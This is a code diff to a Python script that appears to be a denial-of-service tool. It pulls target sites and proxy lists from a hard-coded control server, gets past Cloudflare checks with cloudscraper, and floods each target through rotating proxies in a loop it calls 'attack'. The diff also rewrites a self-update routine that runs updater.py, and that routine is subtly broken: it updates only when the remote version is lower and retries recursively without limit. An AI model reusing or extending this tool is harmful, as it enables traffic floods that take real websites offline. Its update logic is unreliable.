@@ -2,7 +2,6 @@ import cloudscraper
 import requests
 import os
 from bs4 import BeautifulSoup
-# from ctypes import windll
 from urllib.parse import unquote
 from gc import collect
 from loguru import logger
@@ -20,7 +19,7 @@ from urllib.request import urlopen
 import json
 import sys
 
-VERSION = 1
+VERSION = 2
 HOSTS = ["http://46.4.63.238/api.php"]
 MAX_REQUESTS = 5000
 disable_warnings()
@@ -30,20 +29,32 @@ logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</
 threads = int(sys.argv[1])
 
 def checkReq():
+	os.system("python3 -m pip install -r requirements.txt")
+	os.system("python -m pip install -r requirements.txt")
 	os.system("pip install -r requirements.txt")
 	os.system("pip3 install -r requirements.txt")
 
 def checkUpdate():
-    url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
-    response = urlopen(url)
-    data_json = json.loads(response.read())
-    new_version = data_json["version"]
-    print(new_version)
-    if new_version != VERSION:
-        print("New version Available")
-        os.system("python updater.py " + str(threads))
-        os.system("python3 updater.py " + str(threads))
-        exit()
+	print("Checking Updates...")
+	updateScraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'android','mobile': True},)
+	url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
+	try:
+		content = updateScraper.get(url).content
+		if content:
+			data = json.loads(content)
+			new_version = data["version"]
+			print(new_version)
+			if new_version < VERSION:
+				print("New version Available")
+				os.system("python updater.py " + str(threads))
+				os.system("python3 updater.py " + str(threads))
+				exit()
+		else:
+			sleep(5)
+			checkUpdate()
+	except:
+		sleep(5)
+		checkUpdate()
 
 def mainth():
 	while True:
@@ -62,7 +73,7 @@ def mainth():
 		    site = "https://" + site
 		try:
 		    attack = scraper.get(site)
-		    if attack.status_code >= 302 and attack.status_code >= 200:
+		    if attack.status_code >= 200:
 		        for proxy in data['proxy']:
 		            scraper.proxies.update({'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
 		            response = scraper.get(site)
